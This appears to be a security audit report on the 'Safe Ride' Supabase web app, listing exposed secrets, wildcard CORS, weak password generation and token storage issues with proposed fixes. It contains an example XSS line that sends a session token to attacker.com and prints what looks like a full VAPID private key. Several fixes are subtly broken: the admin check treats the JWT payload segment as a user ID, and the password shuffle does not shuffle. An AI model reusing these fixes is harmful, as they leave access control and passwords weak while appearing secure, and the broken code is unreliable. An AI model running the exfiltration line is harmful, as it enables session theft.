# 🔒 Safe Ride Security Audit Report
**Date:** January 26, 2026  
**Status:** ⚠️ **CRITICAL ISSUES FOUND**

---

## 📋 Executive Summary

The Safe Ride application has **significant security vulnerabilities** that need immediate attention. While the system implements some security measures (RLS, authentication), there are **critical exposures** in credential management, CORS configuration, and secrets handling.

---

## 🚨 CRITICAL ISSUES (Fix Immediately)

### 1. **Exposed Secret Keys in .env File** 🔴
**Severity:** CRITICAL  
**Location:** `/.env`

**Problem:**
- **Supabase Service Role Key** is exposed in version control
- **VAPID Private Key** for push notifications is visible
- These are **production secrets** that should NEVER be committed

**Evidence:**
```dotenv
VITE_SUPABASE_SERVICE_ROLE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6..."
SUPABASE_VAPID_PRIVATE_KEY="DKU8YWynGHOvHn4OVhv_X4bGEROimdCkZ-iKotzSvqg"
```

**Impact:**
- 🔓 Attackers can access all Supabase data as admin
- 📤 Full control over push notifications
- 💰 Potential data theft, account takeover

**Fix:**
```bash
# 1. Add .env to .gitignore
echo ".env" >> .gitignore
echo ".env.local" >> .gitignore
echo ".env.*.local" >> .gitignore

# 2. IMMEDIATELY rotate ALL secrets in Supabase dashboard
# 3. Create .env.example with placeholder values only
```

**Action Required:** 🛑 **IMMEDIATE - ROTATE ALL KEYS NOW**

---

### 2. **Overly Permissive CORS Configuration** 🔴
**Severity:** CRITICAL  
**Location:** Multiple files - `supabase/functions/*/index.ts`, `supabase/config.json`

**Problem:**
```typescript
// ❌ DANGEROUS - Allows ANY origin
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}
```

**Affected Functions:**
- `send-push-notifications`
- `assign-student-role`
- `create-student-account`
- `create-pnp-account`
- `delete-auth-user`

**Impact:**
- 🌐 Any website can call your APIs
- 🎭 CSRF (Cross-Site Request Forgery) attacks
- 📞 Malicious sites can trigger sensitive operations
- 🔓 Bypass authentication mechanisms

**Fix:**
```typescript
// ✅ SAFE - Whitelist specific origins
const ALLOWED_ORIGINS = [
  'https://safe-ride.isu.edu.ph',
  'https://www.safe-ride.isu.edu.ph',
  'http://localhost:8080', // Dev only
];

const corsHeaders = {
  'Access-Control-Allow-Origin': req.headers.get('origin') && ALLOWED_ORIGINS.includes(req.headers.get('origin') || '') ? req.headers.get('origin') : 'https://safe-ride.isu.edu.ph',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'authorization, content-type',
  'Access-Control-Max-Age': '86400',
};
```

---

### 3. **Publishable Key Exposed (Minor)** 🟡
**Severity:** HIGH  
**Location:** `/.env`, `src/integrations/supabase/client.ts`

**Problem:**
```dotenv
VITE_SUPABASE_PUBLISHABLE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**Why It's a Problem:**
- Publishable keys are meant to be public but **only with proper RLS**
- Can be decoded from network requests
- Reveals your Supabase project structure

**Impact:** Medium - RLS policies prevent direct abuse, but enables reconnaissance attacks

---

## ⚠️ HIGH PRIORITY ISSUES

### 4. **Weak Password Generation** 🟠
**Severity:** HIGH  
**Location:** `src/pages/admin/RegisterStudent.tsx`

**Problem:**
```typescript
const generatePassword = () => {
  let password = "";
  for (let i = 0; i < 8; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  // Only 8 characters, basic character set
  setFormData({ ...formData, password });
};
```

**Issues:**
- ❌ Minimum 8 characters (should be 12+)
- ❌ No complexity requirements
- ❌ Generated passwords shown in toast notifications
- ❌ Not using cryptographically secure random

**Fix:**
```typescript
const generateSecurePassword = () => {
  const length = 16;
  const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const lowercase = 'abcdefghijklmnopqrstuvwxyz';
  const numbers = '0123456789';
  const symbols = '!@#$%^&*';
  const allChars = uppercase + lowercase + numbers + symbols;
  
  let password = '';
  password += uppercase[crypto.getRandomValues(new Uint32Array(1))[0] % uppercase.length];
  password += lowercase[crypto.getRandomValues(new Uint32Array(1))[0] % lowercase.length];
  password += numbers[crypto.getRandomValues(new Uint32Array(1))[0] % numbers.length];
  password += symbols[crypto.getRandomValues(new Uint32Array(1))[0] % symbols.length];
  
  for (let i = 4; i < length; i++) {
    password += allChars[crypto.getRandomValues(new Uint32Array(1))[0] % allChars.length];
  }
  
  return password.split('').sort(() => crypto.getRandomValues(new Uint32Array(1))[0] - 0.5).join('');
};
```

---

### 5. **localStorage Used for Auth Tokens** 🟠
**Severity:** HIGH  
**Location:** `src/integrations/supabase/client.ts`, `src/lib/auth.ts`

**Problem:**
```typescript
export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: localStorage,  // ❌ Vulnerable to XSS
    persistSession: true,
  },
});
```

**Vulnerability:**
- 🔓 Any XSS attack can steal session tokens
- 💀 No HTTPOnly flag protection
- 👁️ Visible in browser DevTools

**Example Attack:**
```javascript
// Injected XSS code
fetch('https://attacker.com/steal?token=' + localStorage.getItem('sb-taordwpdtmfdfquwjlfo-auth-token'));
```

**Fix:**
```typescript
// Option 1: Use sessionStorage (cleared on browser close)
auth: {
  storage: sessionStorage,
  persistSession: false,  // Don't persist across tabs
}

// Option 2: Implement secure custom storage with HTTPOnly cookies
// Option 3: Use Supabase Auth with Auto-Refresh
```

---

### 6. **Passwords Displayed in Toast Notifications** 🟠
**Severity:** HIGH  
**Location:** `src/pages/admin/RegisterStudent.tsx:164`

**Problem:**
```typescript
toast.info(`Student ID: ${formData.studentIdNumber}\nPassword: ${formData.password}`, {
  duration: 5000,
});
```

**Risk:**
- 📹 Visible on screen (shoulder surfing)
- 📸 Screenshots capture passwords
- 🔍 Browser history may store it

**Fix:**
```typescript
// ✅ Only show a success message
toast.success("Student registered successfully. A temporary password has been sent to their email.");

// Send password ONLY via email, never display in UI
```

---

## 🔴 MEDIUM PRIORITY ISSUES

### 7. **No Input Validation/Sanitization** 🟡
**Severity:** MEDIUM  
**Location:** Multiple form components

**Problem:**
- No validation against SQL injection
- No XSS protection for user inputs
- Free-text fields accept any input
- No length limits on most fields

**Example Vulnerable Code:**
```typescript
// In StudentRegister.tsx - No sanitization
<Input
  id="fullName"
  required
  value={formData.fullName}
  onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
  placeholder="Full Name"
/>
```

**Fix:**
```typescript
import DOMPurify from 'dompurify';
import * as z from 'zod';

// Schema validation
const studentSchema = z.object({
  fullName: z.string().min(2).max(100).trim(),
  email: z.string().email(),
  studentIdNumber: z.string().regex(/^\d{4}-\d{5}$/),
  contactNumber: z.string().regex(/^09\d{9}$/),
});

// Sanitization
const sanitizeInput = (input: string) => {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
};
```

---

### 8. **Missing Content Security Policy (CSP)** 🟡
**Severity:** MEDIUM  
**Location:** `index.html`

**Problem:**
- No CSP headers defined
- Vulnerable to XSS attacks
- No protection against inline scripts

**Fix - Add to `index.html` `<head>`:**
```html
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self'; 
           script-src 'self' 'wasm-unsafe-eval'; 
           style-src 'self' 'unsafe-inline'; 
           img-src 'self' data: https:; 
           font-src 'self'; 
           connect-src 'self' https://bsvqdfgqjcypzaafocji.supabase.co https://maps.googleapis.com;
           frame-ancestors 'none';
           base-uri 'self';
           form-action 'self';">
```

---

### 9. **Insufficient Access Control in Functions** 🟡
**Severity:** MEDIUM  
**Location:** `supabase/functions/*/index.ts`

**Problem:**
```typescript
// Basic token verification - not sufficient
const token = authHeader.replace('Bearer ', '');

// ❌ No verification if token is valid or belongs to admin
const { data: { user }, error: userError } = await supabaseAdmin.auth.admin.getUser(token);
```

**Should Verify:**
- Token expiration
- User role/permissions
- Rate limiting
- Request signatures

**Fix:**
```typescript
async function verifyAdminToken(token: string) {
  try {
    const { data, error } = await supabaseAdmin.auth.admin.getUserById(
      // Extract user from token properly
      token.split('.')[1]
    );
    
    if (error) throw new Error('Invalid token');
    
    // Check if user is admin
    const { data: roles } = await supabaseAdmin
      .from('user_roles')
      .select('role')
      .eq('user_id', data.user.id)
      .eq('role', 'admin');
    
    if (!roles?.length) throw new Error('Not an admin');
    
    return data.user;
  } catch (error) {
    throw new Error('Authorization failed');
  }
}
```

---

### 10. **RLS Policies May Have Gaps** 🟡
**Severity:** MEDIUM  
**Location:** `supabase/migrations/*.sql`

**Current Implementation:**
```sql
CREATE POLICY "Users can view their own data" 
ON students FOR SELECT
TO authenticated
USING (auth.uid() = user_id);
```

**Issues Found:**
- ✅ Good: Students can only view their own data
- ✅ Good: Admins can view all students
- ⚠️ Unclear: What about drivers accessing student data?
- ⚠️ Missing: Delete policies
- ⚠️ Missing: Service role restrictions

**Recommendation:**
```sql
-- Explicitly deny certain operations
CREATE POLICY "No one can delete students"
ON students FOR DELETE
TO authenticated
USING (false);  -- Always deny

-- Restrict service role for sensitive operations
CREATE POLICY "Only admins via function can delete"
ON students FOR DELETE
TO authenticated
USING (
  auth.uid() IN (
    SELECT user_id FROM user_roles WHERE role = 'admin'
  )
);
```

---

## 🟢 GOOD PRACTICES FOUND ✅

1. **Row Level Security (RLS) Enabled** ✅
   - Tables have RLS policies
   - Different access levels per role

2. **Supabase Authentication** ✅
   - Using managed auth service
   - OAuth integration available

3. **Role-Based Access Control (RBAC)** ✅
   - Multiple roles defined (admin, student, driver, pnp)
   - Protected routes implemented

4. **Session Management** ✅
   - Auto token refresh configured
   - Session detection on startup

5. **Android Manifest Security** ✅
   - `android:exported="false"` on most components
   - Required permissions specified

---

## 📋 ACTION ITEMS - Priority Order

### 🔴 CRITICAL (Do Today)
- [ ] **Rotate all Supabase keys immediately**
  - Regenerate service role key in Supabase console
  - Regenerate VAPID keys
  - Update in production .env

- [ ] **Remove .env from git history**
  ```bash
  git rm --cached .env
  git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch .env' -- --all
  ```

- [ ] **Fix CORS Configuration**
  - [ ] `supabase/functions/send-push-notifications/index.ts`
  - [ ] `supabase/functions/assign-student-role/index.ts`
  - [ ] `supabase/functions/create-student-account/index.ts`
  - [ ] `supabase/functions/create-pnp-account/index.ts`
  - [ ] `supabase/functions/delete-auth-user/index.ts`
  - [ ] Update `supabase/config.json`

### 🟠 HIGH (This Week)
- [ ] Implement secure password generation
- [ ] Move from localStorage to sessionStorage for auth tokens
- [ ] Remove password display from toast notifications
- [ ] Add input validation and sanitization
- [ ] Implement Content Security Policy (CSP) headers

### 🟡 MEDIUM (This Month)
- [ ] Add comprehensive input validation with Zod
- [ ] Implement rate limiting on Edge Functions
- [ ] Add request signature verification
- [ ] Complete RLS policy audit
- [ ] Setup security headers (HSTS, X-Frame-Options, etc.)
- [ ] Implement logging/monitoring

---

## 🛠️ Quick Security Improvements

### 1. Update `src/integrations/supabase/client.ts`:
```typescript
export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: sessionStorage,  // Changed from localStorage
    persistSession: false,     // Don't persist across sessions
    autoRefreshToken: true,
    detectSessionInUrl: true,
  },
});
```

### 2. Create `.env.example`:
```dotenv
VITE_SUPABASE_PROJECT_ID=your_project_id_here
VITE_SUPABASE_PUBLISHABLE_KEY=your_publishable_key_here
VITE_SUPABASE_URL=your_supabase_url_here
VITE_SUPABASE_SERVICE_ROLE_KEY=NEVER_EXPOSE_THIS_KEY
VITE_VAPID_PUBLIC_KEY=your_vapid_public_key_here
SUPABASE_VAPID_PRIVATE_KEY=NEVER_EXPOSE_THIS_KEY
```

### 3. Update `.gitignore`:
```
.env
.env.local
.env.*.local
*.key
*.pem
```

---

## 📚 Resources for Hardening

1. **OWASP Top 10:** https://owasp.org/www-project-top-ten/
2. **Supabase Security:** https://supabase.com/docs/guides/security
3. **React Security:** https://cheatsheetseries.owasp.org/cheatsheets/React_Security_Cheat_Sheet.html
4. **API Security:** https://cheatsheetseries.owasp.org/cheatsheets/REST_API_Security_Cheat_Sheet.html
5. **Environment Variables:** https://12factor.net/config

---

## 📊 Security Score: **4/10** ⚠️

| Category | Score | Status |
|----------|-------|--------|
| Authentication | 6/10 | ⚠️ Has issues |
| Authorization | 7/10 | ✅ Good foundation |
| Data Protection | 3/10 | 🔴 Critical gaps |
| API Security | 4/10 | 🔴 CORS exposed |
| Input Validation | 3/10 | 🔴 Missing |
| Infrastructure | 5/10 | ⚠️ Needs hardening |

---

**Generated:** January 26, 2026  
**Recommendation:** Address all CRITICAL and HIGH items before production deployment.
